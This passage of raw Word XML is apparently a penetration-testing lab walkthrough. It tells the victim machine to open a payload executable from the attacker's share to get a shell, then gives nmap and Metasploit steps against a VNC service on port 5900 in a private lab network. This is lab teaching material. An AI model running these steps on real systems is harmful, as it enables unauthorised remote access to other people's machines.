    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000000C6">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="yellow"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000000C7">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="yellow"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000000C8">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="yellow"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="yellow"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">NOW WE NEED TO GO TO THE WEB BROWSER AND TYPE </w:t>
      </w:r>
      <w:hyperlink r:id="rId41">
        <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
          <w:rPr>
            <w:b w:val="1"/>
            <w:bCs w:val="1"/>
            <w:color w:val="1155cc"/>
            <w:sz w:val="32"/>
            <w:szCs w:val="32"/>
            <w:highlight w:val="yellow"/>
            <w:u w:val="single"/>
            <w:rtl w:val="0"/>
          </w:rPr>
          <w:t xml:space="preserve">http://10.10.1.3/share</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000000C9">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="yellow"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000000CA">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="yellow"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="yellow"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">And then find swaksharc.exe and then open it</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000000CB">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="yellow"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000000CC">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="yellow"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000000CD">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="yellow"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distB="114300" distT="114300" distL="114300" distR="114300">
            <wp:extent cx="5731200" cy="2997200"/>
            <wp:effectExtent b="0" l="0" r="0" t="0"/>
            <wp:docPr id="74"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bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="yellow"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="yellow"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Now e can type “shell”</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000000CF">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="yellow"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000000D0">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="yellow"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distB="114300" distT="114300" distL="114300" distR="114300">
            <wp:extent cx="5731200" cy="2997200"/>
            <wp:effectExtent b="0" l="0" r="0" t="0"/>
            <wp:docPr id="8"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b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="yellow"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000000D2">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="yellow"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distB="114300" distT="114300" distL="114300" distR="114300">
            <wp:extent cx="5731200" cy="2997200"/>
            <wp:effectExtent b="0" l="0" r="0" t="0"/>
            <wp:docPr id="96" name="image95.png"/>
            <a:graphic>
              <a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/picture">
                <pic:pic>
                  <pic:nvPicPr>
                    <pic:cNvPr id="0" name="image95.png"/>
                    <pic:cNvPicPr preferRelativeResize="0"/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId4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bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="yellow"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="yellow"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Again we have access to the files in the victim windows machine</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000000D4">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="yellow"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000000D5">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="38"/>
          <w:szCs w:val="38"/>
          <w:highlight w:val="red"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="38"/>
          <w:szCs w:val="38"/>
          <w:highlight w:val="red"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">CREATING A VNC SESSION BY EXPLOITING THE PORT “5900”</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000000D6">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="38"/>
          <w:szCs w:val="38"/>
          <w:highlight w:val="red"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000000D7">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="38"/>
          <w:szCs w:val="38"/>
          <w:highlight w:val="red"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="38"/>
          <w:szCs w:val="38"/>
          <w:highlight w:val="red"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Victim ip: 10.10.1.4</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000000D8">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="38"/>
          <w:szCs w:val="38"/>
          <w:highlight w:val="red"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="38"/>
          <w:szCs w:val="38"/>
          <w:highlight w:val="red"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Target machine:kali linux : 10.10.1.3</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000000D9">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="38"/>
          <w:szCs w:val="38"/>
          <w:highlight w:val="red"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="38"/>
          <w:szCs w:val="38"/>
          <w:highlight w:val="red"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Port: 5900</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000000DA">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="38"/>
          <w:szCs w:val="38"/>
          <w:highlight w:val="red"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="38"/>
          <w:szCs w:val="38"/>
          <w:highlight w:val="red"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Command: nmap -sV -p5900 10.10.1.4</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000000DB">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="38"/>
          <w:szCs w:val="38"/>
          <w:highlight w:val="red"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000000DC">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56" name="image94.png"/>
            <a:graphic>
              <a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/picture">
                <pic:pic>
                  <pic:nvPicPr>
                    <pic:cNvPr id="0" name="image94.png"/>
                    <pic:cNvPicPr preferRelativeResize="0"/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId4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bCs w:val="1"/>
          <w:sz w:val="38"/>
          <w:szCs w:val="38"/>
          <w:highlight w:val="red"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="38"/>
          <w:szCs w:val="38"/>
          <w:highlight w:val="red"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">We can see that it is open for the metasploitable tool and the port number 5900 is a vnc session port with version 3.3</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000000DE">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="38"/>
          <w:szCs w:val="38"/>
          <w:highlight w:val="red"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000000DF">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="38"/>
          <w:szCs w:val="38"/>
          <w:highlight w:val="red"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="38"/>
          <w:szCs w:val="38"/>
          <w:highlight w:val="red"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Now we will go to metasploit-framework tool and search for vnc 3.3</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000000E0">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="38"/>
          <w:szCs w:val="38"/>
          <w:highlight w:val="red"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000000E1">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25"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b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="38"/>
          <w:szCs w:val="38"/>
          <w:highlight w:val="red"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="38"/>
          <w:szCs w:val="38"/>
          <w:highlight w:val="red"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Now we will type “use 1”</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000000E3">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="38"/>
          <w:szCs w:val="38"/>
          <w:highlight w:val="red"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000000E4">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92" name="image90.png"/>
            <a:graphic>
              <a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/picture">
                <pic:pic>
                  <pic:nvPicPr>
                    <pic:cNvPr id="0" name="image90.png"/>
                    <pic:cNvPicPr preferRelativeResize="0"/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId4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bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Then type show options</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000000E6">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000000E7">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Now we need to type</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000000E8">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">set RHOSTS 10.10.1.4</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000000E9">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">set RPORT 5900</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000000EA">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">set STOP_ON_SUCCESS true</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000000EB">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000000EC">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Then type “exploit”</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000000ED">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000000EE">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000000EF">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000000F0">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000000F1">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83" name="image89.png"/>
            <a:graphic>
              <a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/picture">
                <pic:pic>
                  <pic:nvPicPr>
                    <pic:cNvPr id="0" name="image89.png"/>
                    <pic:cNvPicPr preferRelativeResize="0"/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId4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1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000000F3">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
